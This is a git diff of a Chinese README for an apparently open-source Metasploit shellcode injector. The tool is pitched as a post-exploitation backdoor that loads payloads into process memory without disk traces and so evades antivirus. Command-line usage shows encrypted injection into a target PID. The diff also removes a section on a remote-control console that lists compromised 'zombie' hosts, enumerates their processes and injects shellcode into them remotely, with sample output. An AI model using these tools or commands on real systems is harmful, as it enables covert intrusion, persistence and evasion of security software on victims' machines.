@@ -1,20 +1,6 @@
-# Metasploit 后渗透后门
+# Metasploit 本地ShellCode注入工具
 
 <br>
-
-<div align=center>
-  
-![logo](https://user-images.githubusercontent.com/52789403/185021479-1816c5bc-2ad4-4d54-beca-08ba5e3b3253.png)
-
-<br>
-
-[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/PeView) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com) 
-
-</div>
-
-<br><br>
-
-## ShellCode 本地注入工具
 
 一款本地通用ShellCode后门注入器，该工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后Metasploit即可获取控制权，只要对端不关机则权限会维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。
 
@@ -140,93 +126,4 @@ C:\Users\admin\Desktop> sc32.exe EncodeInFile --path d://encode.txt --passwd lys
 **加密注入远程进程反弹:** 直接注入加密后的代码到远程进程中，实现方式如上。
 ```
 C:\Users\admin\Desktop> sc32.exe EncodePidInFile --pid 17480 --path d://encode.txt --passwd lyshark
-```
-
-## ShellCode 远程注入工具
-
-LySocket 是一款使用纯WindowsAPI实现的命令行版远程控制工具，该工具通过最少的代码实现了套接字的批量管理操作，用户可以指定对特定进程进行远程注入，只要对端客户端能一直运行，则MSF攻击载荷可以很方便的注入并被运行。
-```C
-[ LySocket ] # help
- _            ____             _        _
-| |   _   _  / ___|  ___   ___| | _____| |_
-| |  | | | | \___ \ / _ \ / __| |/ / _ \ __|
-| |__| |_| |  ___) | (_) | (__|   <  __/ |_
-|_____\__, | |____/ \___/ \___|_|\_\___|\__|
-      |___/
-
-Usage: LySocket 演示版
-Email: me@lyshark.com
-Optional:
-
-         --ShowSocket        输出所有上线客户端
-         --GetCPU            获取客户端CPU数据
-         --GetMemory         获取客户端内存数据
-         --GetProcessList    获取客户端正在运行进程列表
-         --InjectSelfCode    将ShellCode注入到客户端内
-         --InjectRemoteCode  将ShellCode注入到客户端指定进程内
-         --CloseServer       正常退出服务端
-         --Exit              退出远程客户端
-```
-
-命令`ShowSocket`可输出当前有多少肉鸡上线了，用于确定对端IP地址，该套接字列表程序内会自动维护，如果客户端下线则Socket套接字将会被清理。
-```C
-[ LySocket ] # ShowSocket
---------------------------------------------------------------------
-索引             客户端地址              端口            状态
---------------------------------------------------------------------
-0                127.0.0.1               1763            Open
-1                127.0.0.1               1806            Open
-2                127.0.0.1               1807            Open
-3                127.0.0.1               1808            Open
---------------------------------------------------------------------
-[ LySocket ] #
-```
-命令`GetCPU,GetMemory`可用于得到对点主机信息，目前只是作为演示案例使用。
-```C
-[ LySocket ] # GetCPU --address 127.0.0.1
---------------------------------------------------------------------
-CPUID: 3219913727
-CPU型号: GenuineIntel
-idle: 18281250
-kernel: 18437500
-user: 312500
-cpu: 2
---------------------------------------------------------------------
-
-[ LySocket ] # GetMemory --address 127.0.0.1
---------------------------------------------------------------------
-内存总量                 内存剩余                内存已使用
---------------------------------------------------------------------
-16219 MB                 10953 MB                5266 MB
-16219 MB                 10953 MB                5266 MB
-16219 MB                 10953 MB                5266 MB
-16219 MB                 10953 MB                5266 MB
---------------------------------------------------------------------
-```
-命令`GetProcessList`可用于得到对段主机内有哪些进程正在运行，这是注入代码的前提条件。
-```C
-[ LySocket ] # GetProcessList --address 127.0.0.1
---------------------------------------------------------------------
-索引             进程PID                 进程位数                进程名
---------------------------------------------------------------------
-0                4       x64             System
-1                124     x64             Registry
-2                568     x64             smss.exe
-3                856     x64             csrss.exe
-4                956     x64             wininit.exe
-5                964     x64             csrss.exe
-6                80      x64             services.exe
-7                484     x64             lsass.exe
-8                564     x64             winlogon.exe
-9                672     x64             svchost.exe
-10               1060    x64             fontdrvhost.exe
-11               1068    x64             fontdrvhost.exe
-12               1100    x64             WUDFHost.exe
---------------------------------------------------------------------
-```
-得到了特定继承的PID序号以后，就可以使用如下命令注入ShellCode到特定进程内，MSF即可反弹后门链接了。
-```C
-[ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode xfec12defferciruq
-[+] Success..
-[ LySocket ] #
 ```
